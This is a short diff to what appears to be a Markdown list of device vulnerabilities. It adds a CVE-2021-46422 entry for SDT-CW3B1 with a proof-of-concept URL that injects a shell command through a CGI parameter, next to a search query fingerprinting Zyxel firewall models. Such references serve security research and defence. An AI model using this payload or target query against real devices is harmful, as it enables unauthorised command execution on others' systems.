@@ -164,3 +164,10 @@ Rapid7 discovered and reported a vulnerability that affects Zyxel firewalls supp
 ```
 title:"USG FLEX 100","USG FLEX 100w","USG FLEX 200","USG FLEX 500","USG FLEX 700","USG FLEX 50","USG FLEX 50w","ATP100","ATP200","ATP500","ATP700"
 ```
+
+## SDT-CW3B1 1.1.0 - OS Command Injection (CVE-2021-46422)
+
+```
+poc:http://<IP>/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id
+```
+
